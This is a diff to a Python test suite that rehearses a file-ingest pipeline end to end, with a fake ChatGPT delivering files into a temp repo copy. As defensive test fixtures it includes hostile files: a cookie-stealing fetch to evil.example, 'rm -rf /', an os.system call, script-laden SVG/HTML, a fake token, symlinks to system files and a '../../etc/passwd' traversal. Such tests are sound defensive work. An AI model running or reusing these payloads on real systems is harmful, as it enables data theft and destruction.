@@ -9,6 +9,9 @@
   d. prepare: approved images are copied to olympus/assets/<id>/ with a manifest and an index; rejected files and scripts are never copied; the site copy has a budget
   e. never executes: the ingest source has no exec / eval / compile / import of delivered files / subprocess
   f. suggest(): the weekly rules (question first, in progress, first win, category of the week, gap, quick), at most 5, no duplicates, changes by week
+  g. JOB 13 (2026-11-04) the END-TO-END REHEARSAL with a fake ChatGPT, in a TEMP copy of the repo: three jobs picked from the library (money, research, content),
+     ChatGPT's answer files in handoff/inbox/<id>/, the ingest, status.json / SYNC.md, the 'Bridge: <name> done' hand-back, hostile / oversized / wrong-type files each
+     rejected with ONE plain sentence, nothing outside handoff/ written (a read-only run changes no byte; --apply writes only olympus/assets/), the real repo untouched
     python -X utf8 -m tests.test_bridge_ingest
 """
 from __future__ import annotations
@@ -280,6 +283,190 @@ def part_suggest():
           and set(st["counts"]) == {"total", "done", "question", "in_progress", "files"} and st["counts"]["total"] == len(B.job_ids()), st["counts"])
 
 
+# ------------------------------------------------------------------------------------------------------------ g: the END-TO-END rehearsal with a fake ChatGPT (JOB 13, 2026-11-04)
+def tree_hash(root):
+    """{relative path: sha1} of every file under root (symlinks are hashed as their link text, never followed)"""
+    import hashlib
+    out = {}
+    for dp, dns, fns in os.walk(root, followlinks=False):
+        for fn in fns:
+            full = os.path.join(dp, fn)
+            rel = os.path.relpath(full, root).replace(os.sep, "/")
+            if os.path.islink(full):
+                out[rel] = "link:" + os.readlink(full)
+            else:
+                with open(full, "rb") as fh:
+                    out[rel] = hashlib.sha1(fh.read()).hexdigest()
+    return out
+
+
+def fake_chatgpt(inbox, job, with_done=True):
+    """What a ChatGPT that follows the job prompt would leave in handoff/inbox/<id>/: every file the prompt names, then DONE.md"""
+    d = os.path.join(inbox, job["id"])
+    os.makedirs(d, exist_ok=True)
+    for f in job["files"]:
+        if f == "DONE.md":
+            continue
+        if f.endswith(".md"):
+            body = f"# {job['title']}\n\n- Made for the owner (plain words).\n- Source: example.org, checked 2026-11-04.\n- UNVERIFIED items are marked.\n"
+        elif f.endswith(".json"):
+            body = json.dumps({"job": job["id"], "items": [{"name": "a"}, {"name": "b"}]})
+        elif f.endswith(".png"):
+            put(d, f, png(8, 8))
+            continue
+        else:
+            body = "plain text\n"
+        put(d, f, body)
+    if with_done:
+        put(d, "DONE.md", f"Made {job['title']}. Files: " + ", ".join(x for x in job["files"] if x != "DONE.md") + ". Nothing to wire.")
+    return d
+
+
+SAFE_SENTENCE = re.compile(r"^[A-Z][^\n]{15,200}[.)]$")
+JARGON = re.compile(r"fetch|eval|XMLHttpRequest|symlink|UTF|sha256|regex|base64|MIME|exploit|payload|sandbox|\bXSS\b|CSRF", re.I)
+
+
+def part_rehearsal():
+    import subprocess
+    py = [sys.executable, "-B", "-X", "utf8"]                      # -B: no .pyc files, so the rehearsal writes nothing but what the tools write
+    doc = json.load(open(os.path.join(ROOT, "tools", "web_public", "bridge", "jobs.json"), encoding="utf-8"))
+    lib = {j["id"]: j for j in doc["jobs"]}
+    money = sorted(j for j in lib if j == "money-risk-budget") or sorted(j for j in lib if lib[j]["cat"] == "money")
+    research = sorted(j for j in lib if lib[j]["cat"] == "research")
+    content = sorted(j for j in lib if "content" in j) or sorted(j for j in lib if lib[j]["cat"] == "copy")
+    picks = [money[0], research[0], content[0]]
+    check(f"g. rehearsal: three jobs picked from the library of {len(lib)} like the owner would: a money one ({picks[0]}), a research one ({picks[1]}), a content one ({picks[2]})", len({lib[i]['cat'] for i in picks}) >= 2 and len(set(picks)) == 3, picks)
+    # the real repo is never touched: hash the places the flow could write
+    real_places = [os.path.join(ROOT, "handoff"), os.path.join(ROOT, "tools", "web_public", "bridge"), os.path.join(ROOT, "tools", "web_public", "olympus", "assets")]
+    before = [tree_hash(d) for d in real_places]
+    # a TEMP copy of the repo: only the Bridge files (the scripts find their own root from where they live)
+    t = tmp()
+    os.makedirs(os.path.join(t, "tools", "web_public"))
+    shutil.copytree(os.path.join(ROOT, "handoff"), os.path.join(t, "handoff"))
+    for f in ("bridge_ingest.py", "bridge_sync.py", "bridge_jobs_build.py"):
+        shutil.copy(os.path.join(ROOT, "tools", f), os.path.join(t, "tools", f))
+    shutil.copytree(os.path.join(ROOT, "tools", "web_public", "bridge"), os.path.join(t, "tools", "web_public", "bridge"))
+    inbox = os.path.join(t, "handoff", "inbox")
+
+    def run(*a):
+        r = subprocess.run([*py, *a], cwd=t, capture_output=True, text=True, timeout=120)
+        return r.returncode, r.stdout + r.stderr
+
+    # 1. ChatGPT is working: files but no DONE.md yet
+    fake_chatgpt(inbox, lib[picks[0]], with_done=False)
+    rc, out = run("tools/bridge_ingest.py")
+    check("g. a job with files but no DONE.md is 'in progress' and the report says ChatGPT is not finished", rc == 0 and f"{picks[0]}: in progress" in out and "has not added DONE.md yet" in out, out)
+    # 2. ChatGPT finishes all three
+    for i in picks:
+        fake_chatgpt(inbox, lib[i])
+    snap = tree_hash(t)
+    rc, out = run("tools/bridge_ingest.py")
+    want = {i: len([f for f in lib[i]["files"] if f != "DONE.md"]) for i in picks}
+    check("g. the ingest report: each of the three jobs is done with every file approved and nothing rejected (counts from the library's file lists)",
+          rc == 0 and all(f"{i}: done, {want[i]} approved, 0 rejected" in out for i in picks) and "REJECTED" not in out, out)
+    check("g. the report run is READ-ONLY: not one byte of the whole temp copy changed", tree_hash(t) == snap)
+    # 3. status.json / SYNC.md refresh (what Claude runs): only the three expected files change
+    rc, out = run("tools/bridge_sync.py")
+    after = tree_hash(t)
+    changed = sorted(k for k in set(after) | set(snap) if after.get(k) != snap.get(k))
+    check("g. 'python tools/bridge_sync.py' writes only handoff/SYNC.md and bridge/status.json + deliveries.json, nothing else", rc == 0 and changed == ["handoff/SYNC.md", "tools/web_public/bridge/deliveries.json", "tools/web_public/bridge/status.json"], (rc, changed, out[-200:]))
+    st = json.load(open(os.path.join(t, "tools", "web_public", "bridge", "status.json"), encoding="utf-8"))
+    check("g. status.json now shows the three jobs done with their file counts, counts.done = 3, the 'next' list and the deliveries brief are there",
+          all(st["jobs"][i] == {"state": "done", "files": want[i]} for i in picks) and st["counts"]["done"] == 3 and st["counts"]["total"] == len(B.job_ids()) and len(st["next"]) <= 5 and set(picks) <= set(st["deliveries"]), st["jobs"])
+    sync = open(os.path.join(t, "handoff", "SYNC.md"), encoding="utf-8").read()
+    check("g. SYNC.md's AUTO block lists the three jobs as DONE and the hand-written part (the LINK WORD line, the rules) is untouched",
+          all(f"- {i}: DONE ({want[i] + 1} files)" in sync for i in picks) and re.search(r"^LINK WORD: [A-Z0-9]+$", sync, re.M) and "## ChatGPT section" in sync)
+    dl = json.load(open(os.path.join(t, "tools", "web_public", "bridge", "deliveries.json"), encoding="utf-8"))
+    check("g. deliveries.json (the page's Deliveries tab) carries each job's DONE line and its text, as plain text", all(dl["jobs"][i]["done"].startswith("Made ") and dl["jobs"][i]["approved"] == want[i] for i in picks))
+    # 4. the owner's hand-back text
+    msgs = [f"Bridge: {i} done" for i in picks]
+    outs = [run("tools/bridge_ingest.py", "--handback", m)[1].strip() for m in msgs]
+    check("g. 'Bridge: <name> done' works: Claude's hand-back reads each job back in one plain paragraph ('ChatGPT is done. N files passed the safety check.')",
+          all(o.startswith(f"{i}: ChatGPT is done. {want[i]} file") and "passed the safety check." in o for i, o in zip(picks, outs)), outs)
+    pr = [I.parse_handback(x) for x in ("bridge: Money-Risk-Budget DONE.", "  Bridge :  res-prop-rules   done  ", "Hi Claude! Bridge: copy-tooltips done, thanks", "Bridge: icons question", "Bridge: ../../etc/passwd done", "Bridge: a/b done", "done", "", "Bridge: x done" + "y" * 90)]
+    check("g. the hand-back line is forgiving about capitals, spaces, a full stop and words around it, and never accepts a path (../, slashes) or a long id",
+          pr[:4] == [("money-risk-budget", "done"), ("res-prop-rules", "done"), ("copy-tooltips", "done"), ("icons", "question")] and pr[4] is None and pr[5] is None and pr[6] is None and pr[7] is None and pr[8] is None, pr)
+    nf = I.handback("Bridge: no-such-job done", os.path.join(t, "handoff", "inbox"))
+    bad = I.handback("please do the thing", os.path.join(t, "handoff", "inbox"))
+    fin = fake_chatgpt(inbox, {"id": "waiting-job", "title": "Waiting job", "files": ["a.md", "DONE.md"]}, with_done=False)
+    wait = I.handback("Bridge: waiting-job done", inbox)
+    put(inbox, "asking-job/QUESTION.md", "Which colour do you want?")
+    ask = I.handback("Bridge: asking-job done", inbox)
+    check("g. hand-back edge cases, each ONE plain sentence: unknown job ('cannot find a folder'), not understood, ChatGPT not finished (no DONE.md), ChatGPT has a question (QUESTION.md)",
+          "cannot find a folder called no-such-job" in nf["sentence"] and not nf["ok"] and "did not understand" in bad["sentence"] and not bad["ok"] and "not finished" in wait["sentence"] and not wait["ok"]
+          and "has a question" in ask["sentence"] and not ask["ok"] and all(s["sentence"].count("\n") == 0 for s in (nf, bad, wait, ask)), (nf, bad, wait, ask))
+    # 5. hostile / oversized / wrong-type files from the fake ChatGPT, one job
+    hid = "tex-gold-brushed"
+    hostile = {
+        "gold-albedo.png": png(8, 8),
+        "evil.js": "fetch('https://evil.example/steal?x=' + document.cookie);",
+        "fake.png": "<html><script>alert(1)</script></html>",
+        "huge.png": png(8, 8) + b"\0" * (6 * 1024 * 1024),
+        "setup.exe": b"MZ\x90\x00" + b"\0" * 64,
+        "page.html": "<html><body>hi</body></html>",
+        "run.sh": "#!/bin/sh\nrm -rf /\n",
+        "tool.py": "import os\nos.system('x')\n",
+        "script.svg": '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
+        "notes.md": "<script>alert(1)</script> hello",
+        "key.txt": "my token is ghp_" + "a1B2c3D4e5F6g7H8i9J0" * 2,
+        "bad.json": "{ not json",
+        "bad;name.md": "hello",
+        "double.png.exe": b"MZ\x90\x00",
+        "big.md": "x" * (300 * 1024),
+        ".env": "SECRET=1",
+        "empty.txt": "",
+        "DONE.md": "Made the gold. Files: gold-albedo.png and some others.",
+    }
+    for name, data in hostile.items():
+        put(os.path.join(inbox, hid), name, data)
+    os.symlink("/etc/hostname", os.path.join(inbox, hid, "link.txt"))
+    os.makedirs(os.path.join(t, "outside"))
+    open(os.path.join(t, "outside", "secret.md"), "w").write("outside the inbox")
+    os.symlink(os.path.join(t, "outside"), os.path.join(inbox, hid, "folder-link"))
+    put(os.path.join(inbox, hid), "a/b/c/d/deep.md", "too deep")
+    snap2 = tree_hash(t)
+    outside_before = tree_hash(os.path.join(t, "outside"))
+    res = I.scan_job(os.path.join(inbox, hid), hid)
+    rows = {f["name"]: f for f in res["files"]}
+    rejected = {n for n, f in rows.items() if not f["ok"]}
+    must = {"evil.js", "fake.png", "huge.png", "setup.exe", "page.html", "run.sh", "tool.py", "script.svg", "notes.md", "key.txt", "bad.json", "bad;name.md", "double.png.exe", "big.md", ".env", "empty.txt", "link.txt"}
+    check("g. every hostile, oversized, wrong-type or odd file is rejected, the good picture and DONE.md are approved, and one bad file never hides the others",
+          must <= rejected and rows["gold-albedo.png"]["ok"] and rows["DONE.md"]["ok"] and res["state"] == "done" and res["approved"] == 1, sorted(must - rejected))
+    plain = {n: rows[n].get("plain", "") for n in must}
+    check("g. every rejection comes with ONE plain sentence (a capital letter, one full stop, no technical words like fetch / eval / symlink / UTF)",
+          all(SAFE_SENTENCE.match(s) and s.count(". ") == 0 and not JARGON.search(s) for s in plain.values()), {n: s for n, s in plain.items() if not (SAFE_SENTENCE.match(s) and s.count(". ") == 0 and not JARGON.search(s))})
+    check("g. the sentences say the right thing: a program that reaches the internet, a fake picture, too big, a file type that is not allowed, a hidden program, a secret key, a broken data file, a shortcut",
+          "reach the internet" in plain["evil.js"] and "not a real picture" in plain["fake.png"] and "too big" in plain["huge.png"] and "not allowed" in plain["setup.exe"] and "hidden program" in plain["script.svg"]
+          and "secret key" in plain["key.txt"] and "broken" in plain["bad.json"] and "shortcut" in plain["link.txt"] and "odd characters" in plain["bad;name.md"] and "empty" in plain["empty.txt"], plain)
+    check("g. nothing is followed outside the job: the shortcut to /etc/hostname and the shortcut to a folder outside are not read, the deep folder is ignored, the outside folder is unchanged",
+          "link.txt" in rejected and not any(n.startswith("folder-link") or n.startswith("a/b/c/d") for n in rows) and tree_hash(os.path.join(t, "outside")) == outside_before)
+    rc, out = run("tools/bridge_ingest.py", "--handback", f"Bridge: {hid} done")
+    check("g. the hand-back for the hostile job says what was kept and what was not, in plain words (1 file passed, the first three problems named)", out.startswith(f"{hid}: ChatGPT is done. 1 file passed the safety check and") and "not used." in out and "reach the internet" in out and "\n" not in out.strip(), out)
+    # 6. 'apply' copies only the approved picture, nothing is written outside handoff/ by the read-only runs
+    snap3 = tree_hash(t)
+    rc, out = run("tools/bridge_ingest.py")
+    check("g. the plain report run on the hostile inbox is read-only too (the temp tree is byte-identical)", rc == 0 and tree_hash(t) == snap3 and "REJECTED evil.js" in out and "reach the internet" in out)
+    rc, out = run("tools/bridge_ingest.py", "--apply")
+    after = tree_hash(t)
+    new = sorted(k for k in after if k not in snap3)
+    check("g. '--apply' writes only tools/web_public/olympus/assets/ (the good picture + its manifest + the index), never a rejected file, never the inbox",
+          rc == 0 and all(k.startswith("tools/web_public/olympus/assets/") for k in new) and "tools/web_public/olympus/assets/tex-gold-brushed/gold-albedo.png" in new
+          and not any(n in " ".join(new) for n in ("evil", "fake", "huge", "setup", "key.txt", "link")) and all(after[k] == snap3[k] for k in snap3), new)
+    man = json.load(open(os.path.join(t, "tools", "web_public", "olympus", "assets", hid, "manifest.json"), encoding="utf-8"))
+    check("g. the manifest lists the one approved picture with its size and checksum and every rejected file with its reason", [f["name"] for f in man["files"]] == ["gold-albedo.png"] and len(man["rejected"]) >= len(must) - 1, man["rejected"][:2])
+    # 7. the owner's most likely slips: a folder named in capitals, a file dropped outside a job folder
+    put(inbox, "Money-Risk-Budget/notes.md", "hello")
+    put(inbox, "logo.png", png(4, 4))
+    rc, out = run("tools/bridge_ingest.py")
+    check("g. a folder with capital letters and a file dropped outside any job folder are skipped, and the report says so in plain words (the owner's most likely slips)",
+          "The folder 'Money-Risk-Budget' was skipped" in out and "The file 'logo.png' was skipped: files belong inside a folder named after the job." in out, out[-400:])
+    # 8. the real repo was never touched by any of this
+    after_real = [tree_hash(d) for d in real_places]
+    check("g. the real handoff/, Bridge page and Olympus assets folders were not changed by the rehearsal (it ran in a temp copy)", after_real == before)
+    page = open(os.path.join(ROOT, "tools", "web_public", "bridge", "index.html"), encoding="utf-8").read()
+    check("g. the page's hand-back button builds exactly the text the ingest understands ('Bridge: ' + id + ' done' / ' question')", "'Bridge: ' + j.id + (st && st.state === 'question' ? ' question' : ' done')" in page and "'Bridge: ' + id + ' done'" in page)
+
+
 def main():
     part_library()
     part_validate()
@@ -287,6 +474,7 @@ def main():
     part_prepare(inbox, res)
     part_never_runs()
     part_suggest()
+    part_rehearsal()
     for d in TMPS:
         shutil.rmtree(d, ignore_errors=True)
     n = sum(RES)
